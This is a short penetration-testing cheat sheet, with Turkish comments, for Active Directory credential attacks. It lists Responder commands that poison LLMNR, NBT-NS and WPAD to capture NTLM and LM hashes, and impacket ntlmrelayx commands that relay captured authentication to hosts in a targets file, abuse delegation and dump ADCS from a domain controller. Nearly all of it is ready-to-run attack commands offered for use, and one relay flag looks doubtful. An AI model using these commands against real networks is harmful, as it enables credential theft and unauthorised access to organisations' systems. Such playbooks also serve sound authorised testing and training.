# Responder Playbook

---

# Basic Hash Catching

```
sudo responder -I eth0 -wrd -v --lm
-I eth0: Ağ arayüzü
-w: WPAD zehirleme
-r: LLMNR zehirleme
-d: NBT-NS zehirleme
-v: Verbose mod
--lm: LM hash'leri de yakala

```

# NTLM Relay

```
# Terminal 1 - Responder
sudo responder -I eth0 -wrd -v --disable-smb-server

# Terminal 2 - Relay
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support --no-http-server
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt --delegate-access --no-http-server
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t dc01.domain.local --dump-adcs --no-http-server
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support --no-http-server --signing-required

targets.txt:
10.10.10.10 dc01.domain.local
10.10.10.11 srv01.domain.local
```

